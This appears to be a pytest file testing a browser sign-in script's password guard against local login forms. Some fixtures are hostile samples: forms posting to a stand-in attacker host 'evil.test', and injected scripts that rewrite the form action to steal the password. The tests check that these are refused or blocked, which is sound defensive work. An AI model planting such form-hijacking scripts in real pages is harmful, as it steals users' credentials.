"""The headless sign-in script and password guard in a real Chromium (skipped without one).

The unit tests fake ``page.evaluate``; these run ``SIGN_IN_SCRIPT`` against real forms and
check which request the server actually received.
"""

from __future__ import annotations

import http.server
import threading
import urllib.parse
from collections.abc import Iterator
from dataclasses import replace
from pathlib import Path
from typing import Any, override

import pytest

from codapact.runtime.browser import BrowserLogin, playwright_capture, sign_in_headless
from codapact.runtime.errors import AuthError

sync_api = pytest.importorskip("playwright.sync_api")

FORM = '<form method=post action="/ok">{}<button>Go</button></form>'
PAGES = {
    "/login/mfa": FORM.format(
        '<input name=username value="amy@corp.test">'
        '<input type=password autocomplete="one-time-code" name=c>'
    ),
    "/login/change": FORM.format(
        '<input type=password name=a><input type=password name=b autocomplete="new-password">'
    ),
    "/login/other": FORM.format('<input type=email value="bob@corp.test"><input type=password>'),
    "/login/hidden": FORM.format(
        '<input type=hidden name=username value="bob@corp.test"><input type=password name=p>'
    ),
    "/login/csrf": FORM.format(
        '<input type=hidden name=login_csrf value="t0k"><input name=username>'
        "<input type=password name=p>"
    ),
    "/login/offsite": '<form method=post action="https://evil.test/x">'
    "<input type=email><input type=password name=p><button>Go</button></form>",
    "/login/get": '<form method=get action="/ok"><input name=username>'
    "<input type=password name=p><button>Go</button></form>",
    "/login/outside": '<form id=f method=post action="/ok"><input name=username>'
    "<input type=password name=p></form><button form=f disabled>Go</button>",
    "/settings": FORM.format("<input type=password name=confirm>"),
    "/news": FORM.format("<input type=email name=email>"),
    "/login/typed": FORM.format('<input name=username><input type=password name=p value="mine">'),
    "/login/tenant": FORM.format("<input name=username id=u><input type=password name=p>")
    + '<script>document.getElementById("u").addEventListener("input",'
    '()=>{document.forms[0].action="https://evil.test/t"})</script>',
}
EXPECTED = {
    "/login/mfa": "challenge",
    "/login/change": "unclear",
    "/login/other": "other-account",
    "/login/hidden": "other-account",
    "/login/csrf": "password",
    "/login/offsite": "unsafe",
    "/login/get": "password",
    "/login/outside": "stuck",
    "/settings": "not-sign-in",
    "/news": "not-sign-in",
    "/login/tenant": "changed",
    "/login/typed": "typing",
}


class Site(http.server.ThreadingHTTPServer):
    posts: list[tuple[str, str]]


def _serve(pages: dict[str, str], cookie_on: str = "", after_post: str = "/") -> Site:
    class Handler(http.server.BaseHTTPRequestHandler):
        @override
        def log_message(self, format: str, *args: Any) -> None:  # noqa: A002 (stdlib name)
            pass

        def do_GET(self) -> None:
            path = self.path.split("?")[0]
            if path == "/" and "sid=ok" not in (self.headers.get("Cookie") or ""):
                self.send_response(302)
                self.send_header("Location", "/login")
                self.end_headers()
                return
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(pages.get(path, "home").encode())

        def do_POST(self) -> None:
            size = int(self.headers.get("Content-Length") or 0)
            server.posts.append((self.path, self.rfile.read(size).decode()))
            self.send_response(302)
            if cookie_on and self.path == cookie_on:
                self.send_header("Set-Cookie", "sid=ok; Path=/")
            self.send_header("Location", after_post)
            self.end_headers()

    server = Site(("127.0.0.1", 0), Handler)
    server.posts = []
    threading.Thread(target=server.serve_forever, daemon=True).start()
    return server


@pytest.fixture
def browser() -> Iterator[Any]:
    with sync_api.sync_playwright() as playwright:
        chromium, reason = None, ""
        try:
            chromium = playwright.chromium.launch()
        except sync_api.Error as error:
            reason = str(error).splitlines()[0]
        if chromium is None:
            pytest.skip(f"no browser: {reason}")
        yield chromium
        chromium.close()


def _login(origin: str) -> BrowserLogin:
    login = BrowserLogin(origin + "/", ("sid",), domain="127.0.0.1", username="amy@corp.test")
    return replace(login, password="s3cret pw")


def test_sign_in_script_on_real_forms(browser: Any) -> None:
    site = _serve(PAGES)
    origin = f"http://127.0.0.1:{site.server_port}"
    try:
        page = browser.new_page()
        try:
            for path, expected in EXPECTED.items():
                page.goto(origin + path)
                assert sign_in_headless(page, _login(origin), set(), sync_api.Error) == expected
                page.wait_for_timeout(200)
            # a window without a password leaves the password box to the person
            page.goto(origin + "/login/csrf")
            no_password = replace(_login(origin), password="")
            assert sign_in_headless(page, no_password, set(), sync_api.Error) == "manual"
        finally:
            page.close()
    finally:
        site.shutdown()
    bodies = [urllib.parse.parse_qs(body) for _, body in site.posts]
    # only the CSRF form and the GET form (posted instead) sent the password, both by POST
    assert [b.get("p") for b in bodies] == [["s3cret pw"], ["s3cret pw"]]
    assert all(path == "/ok" for path, _ in site.posts)


def test_renewal_signs_in_and_the_guard_stops_a_late_redirect(tmp_path: Path) -> None:
    pages = {
        "/login": '<form method=post action="/session"><input name=username id=username>'
        "<input type=password name=password><button>Sign in</button></form>",
    }
    site = _serve(pages, cookie_on="/session")
    origin = f"http://127.0.0.1:{site.server_port}"
    evil = _serve({})
    hijack = {
        "/login": pages["/login"] + "<script>document.forms[0].addEventListener('submit', (e) => {"
        f"e.target.action = 'http://127.0.0.1:{evil.server_port}/steal'}})</script>",
    }
    hijacked = _serve(hijack, cookie_on="/session")
    try:
        found: list[Any] | None = None
        reason = ""
        try:
            found = playwright_capture(_login(origin), tmp_path / "a", True, 15.0, "chromium")
        except AuthError as error:
            if "could not start a browser" not in str(error):
                raise
            reason = str(error)
        if found is None:
            pytest.skip(f"no browser: {reason}")
        assert [c["name"] for c in found] == ["sid"]
        assert urllib.parse.parse_qs(site.posts[0][1])["password"] == ["s3cret pw"]
        late = f"http://127.0.0.1:{hijacked.server_port}"
        assert playwright_capture(_login(late), tmp_path / "b", True, 3.0, "chromium") == []
        assert evil.posts == []  # the submit handler moved the form; the request was blocked
    finally:
        for server in (site, evil, hijacked):
            server.shutdown()


def test_a_2fa_page_stops_the_renewal_and_the_trace_says_why(tmp_path: Path) -> None:
    pages = {
        "/login": '<form method=post action="/session"><input name=username id=username>'
        "<input type=password name=password><button>Sign in</button></form>",
        "/login/mfa": '<form method=post action="/verify"><input name=otp '
        'autocomplete="one-time-code"><button>Verify</button></form>',
    }
    site = _serve(pages, after_post="/login/mfa")
    told: list[str] = []
    login = replace(_login(f"http://127.0.0.1:{site.server_port}"), trace=told.append)
    try:
        try:
            found = playwright_capture(login, tmp_path / "p", True, 4.0, "chromium")
        except AuthError as error:
            if "could not start a browser" not in str(error):
                raise
            found = None
        if found is None:
            pytest.skip("no browser")
        assert found == []
        assert "typed the password and submitted" in told
        assert told[-2].startswith("stopped: a one-time-code (2FA) page")
        assert [path for path, _ in site.posts] == ["/session"]  # no code was ever sent
    finally:
        site.shutdown()


def test_the_window_types_once_and_notices_a_rejected_password(tmp_path: Path) -> None:
    """Needs a display (skipped without one): ``xvfb-run pytest`` on Linux."""
    pages = {
        "/login": '<form method=post action="/session"><input name=username id=username>'
        "<input type=password name=password><button>Sign in</button></form>",
    }
    site = _serve(pages, after_post="/login?error=1")  # a wrong password: the form again
    told: list[str] = []
    login = replace(_login(f"http://127.0.0.1:{site.server_port}"), trace=told.append)
    try:
        found: list[Any] | None = None
        try:
            found = playwright_capture(login, tmp_path / "w", False, 4.0, "chromium")
        except AuthError as error:
            if "could not start a browser" not in str(error):
                raise
        if found is None:
            pytest.skip("no display for a browser window")
        assert found == []
        assert [path for path, _ in site.posts] == ["/session"]  # the password went once
        assert "the sign-in page asked for the password again (a wrong password?)" in told
    finally:
        site.shutdown()


def test_asked_again_tells_a_password_retry_from_2fa(browser: Any) -> None:
    from codapact.runtime.browser import ASKED_AGAIN_SCRIPT

    pages: dict[str, str] = {
        "/again": FORM.format("<input name=username><input type=password name=p>"),
        "/code": FORM.format('<input type=password autocomplete="one-time-code" name=c>'),
        "/otp": FORM.format("<input type=password name=otp_code>"),
        "/new": FORM.format('<input type=password autocomplete="new-password" name=n>'),
        "/typed": FORM.format('<input type=password name=p value="x">'),
    }
    site = _serve(pages)
    origin = f"http://127.0.0.1:{site.server_port}"
    try:
        page = browser.new_page()
        try:
            found = {}
            for path in pages:
                page.goto(origin + path)
                found[path] = page.evaluate(ASKED_AGAIN_SCRIPT, page.url)
            assert found == {
                "/again": True,
                "/code": False,
                "/otp": False,
                "/new": False,
                "/typed": False,
            }
            assert page.evaluate(ASKED_AGAIN_SCRIPT, origin + "/again") is False  # moved on
        finally:
            page.close()
    finally:
        site.shutdown()
